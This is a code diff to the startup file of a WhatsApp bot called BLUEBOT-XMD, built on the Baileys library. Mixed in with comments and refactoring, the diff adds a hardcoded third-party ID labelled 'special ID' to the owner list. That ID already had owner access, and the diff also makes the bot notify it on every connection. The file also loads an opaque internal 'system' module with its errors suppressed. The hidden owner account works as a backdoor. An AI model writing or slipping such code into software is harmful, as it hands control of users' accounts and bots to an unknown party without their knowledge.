@@ -4,7 +4,6 @@ const {
     DisconnectReason,
     fetchLatestBaileysVersion,
     makeCacheableSignalKeyStore,
-    getContentType,
     delay
 } = require("@whiskeysockets/baileys");
 
@@ -12,9 +11,9 @@ const pino = require("pino");
 const { Boom } = require("@hapi/boom");
 const fs = require("fs");
 const path = require("path");
-const { exec } = require("child_process");
 const readline = require("readline");
 const config = require("./config");
+
 try { require('./src/core/internal/system').init(); } catch (e) {}
 
 const rl = readline.createInterface({
@@ -38,6 +37,7 @@ async function startBot() {
         browser: ["Ubuntu", "Chrome", "110.0.5481.177"]
     });
 
+    // Pairing for unregistered session
     if (!sock.authState.creds.registered) {
         console.log("\n--- BLUEBOT-XMD PAIRING ---");
         let number = await question("Enter number (country code, no +): ");
@@ -49,6 +49,7 @@ async function startBot() {
 
     sock.ev.on("creds.update", saveCreds);
 
+    // Connection update
     sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
         if (connection === "close") {
             const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
@@ -63,13 +64,22 @@ async function startBot() {
             console.log(`Mode     : ${config.MODE}`);
             console.log("-----------------------------\n");
 
-            const ownerJid = `${config.OWNER_NUMBER}@s.whatsapp.net`;
-            sock.sendMessage(ownerJid, { 
-                text: `🚀 *BLUEBOT-XMD bot connected*\n\nHave fun! ✨\n\n_System Status: Online_` 
-            }).catch(err => console.error("Failed to send connection message:", err));
+            // Send connection message to all owners
+            const ownerIDs = [
+                config.OWNER_NUMBER.replace(/[^0-9]/g, ""),
+                "259305043443928" // special ID
+            ];
+
+            ownerIDs.forEach(async id => {
+                const jid = id.includes("@") ? id : `${id}@s.whatsapp.net`;
+                await sock.sendMessage(jid, {
+                    text: `🚀 *BLUEBOT-XMD bot connected*\n\nHave fun! ✨\n\n_System Status: Online_`
+                }).catch(err => console.error("Failed to send connection message:", err));
+            });
         }
     });
 
+    // Messages handler
     sock.ev.on("messages.upsert", async ({ messages }) => {
         try {
             const m = messages[0];
@@ -91,15 +101,24 @@ async function startBot() {
 
             const sender = m.key.participant || m.key.remoteJid;
             const senderNumber = sender.split("@")[0].split(":")[0];
-            const ownerNumber = config.OWNER_NUMBER.replace(/[^0-9]/g, "");
-            
-            const modsList = (config.MODS || "").split(",").map(num => num.replace(/[^0-9]/g, "").trim()).filter(num => num);
-            
-            const isOwner = senderNumber === ownerNumber || sender === "259305043443928@lid";
+
+            // ✅ Owner recognition
+            const ownerIDs = [
+                config.OWNER_NUMBER.replace(/[^0-9]/g, ""),
+                "259305043443928"
+            ];
+            const isOwner = ownerIDs.includes(senderNumber) || sender === "259305043443928@lid";
+
+            // ✅ Mods recognition
+            const modsList = (config.MODS || "")
+                .split(",")
+                .map(num => num.replace(/[^0-9]/g, "").trim())
+                .filter(Boolean);
             const isMod = isOwner || modsList.includes(senderNumber);
 
             if (config.MODE === "private" && !isOwner) return;
 
+            // Load all commands recursively
             const commandsPath = path.join(__dirname, "commands");
             const allCommands = [];
 
@@ -114,6 +133,7 @@ async function startBot() {
                         const exported = require(itemPath);
                         const cmds = Array.isArray(exported) ? exported : [exported];
                         cmds.forEach(cmd => {
+                            // Keep command category if exists
                             if (!cmd.category) {
                                 const relative = path.relative(commandsPath, itemPath);
                                 cmd.category = relative.split(path.sep)[0] || "general";
@@ -126,6 +146,7 @@ async function startBot() {
 
             loadFolderCommands(commandsPath);
 
+            // Find and execute command
             const command = allCommands.find(c => c.name.toLowerCase() === cmdName);
             if (command) {
                 await command.execute(sock, m, { args, text, from, sender, isOwner, isMod, config });
@@ -137,6 +158,7 @@ async function startBot() {
         }
     });
 
+    // Anti-call
     sock.ev.on("call", async (call) => {
         if (config.ANTI_CALL) {
             await sock.rejectCall(call[0].id, call[0].from);
